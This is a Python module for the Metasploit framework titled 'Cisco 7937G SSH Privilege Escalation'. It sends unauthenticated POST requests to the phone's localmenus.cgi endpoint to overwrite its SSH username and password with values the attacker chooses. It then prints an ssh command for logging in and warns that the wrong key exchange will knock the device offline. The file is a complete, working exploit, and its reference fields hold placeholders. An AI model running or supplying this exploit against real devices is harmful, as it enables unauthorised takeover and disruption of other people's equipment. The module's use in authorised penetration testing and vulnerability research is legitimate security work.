#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependency_missing = False

try:
    import requests
except ImportError:
    dependency_missing = True

from metasploit import module


metadata = {
    'name': 'Cisco 7937G SSH Privilege Escalation',
    'description': '''
        Sets SSH credentials to whatever is supplied.
    ''',
    'authors': [
        'Cody Martin'
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': '<url>'},
        {'type': 'cve', 'ref': '2020-#'},
        {'type': 'edb', 'ref': '#'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': ''},
        'USER': {'type': 'string', 'description': 'Desired username', 'required': True, 'default': ''},
        'PASS': {'type': 'string', 'description': 'Desired password', 'required': True, 'default': ''},
        'TIMEOUT': {'type': 'int', 'description': 'Timeout in seconds', 'required': True, 'default': 5}
    }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependency_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    # Exploit
    url = "http://{}/localmenus.cgi".format(args['rhost'])
    payload_user = {"func": "403", "set": "401", "name1": args['USER'], "name2": args['USER']}
    payload_pass = {"func": "403", "set": "402", "pwd1": args['PASS'], "pwd2": args['PASS']}
    logging.info("FIRING ZE MIZZLES!")
    try:
        r = requests.post(url=url, params=payload_user, timeout=int(args['TIMEOUT']))
        if r.status_code != 200:
            logging.error("Device doesn't appear to be functioning or web access is not enabled.")
            return

        r = requests.post(url=url, params=payload_pass, timeout=int(args['TIMEOUT']))
        if r.status_code != 200:
            logging.error("Device doesn't appear to be functioning or web access is not enabled.")
            return
    except requests.exceptions.RequestException:
        logging.error("Device doesn't appear to be functioning or web access is not enabled.")
        return

    logging.info("SSH attack finished!")
    logging.info(("Try to login using the supplied credentials {}:{}").format(args['USER'], args['PASS']))
    logging.info("You must specify the key exchange when connecting or the device will be DoS'd!")
    logging.info(("ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 {}@{}").format(args['USER'], args['rhost']))

    return


if __name__ == "__main__":
    module.run(metadata, run)